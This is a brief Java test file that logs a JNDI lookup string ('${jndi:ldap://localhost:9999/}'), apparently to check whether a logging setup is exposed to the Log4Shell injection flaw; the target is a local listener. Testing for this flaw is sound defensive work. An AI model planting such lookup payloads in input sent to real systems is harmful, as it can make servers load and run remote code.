import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

/**
 * @author hui
 * 2021/12/10 0010 17:17
 */
public class Log4jTest {
    private static Logger logger = LogManager.getLogger(Log4jTest.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://localhost:9999/}");
    }
}
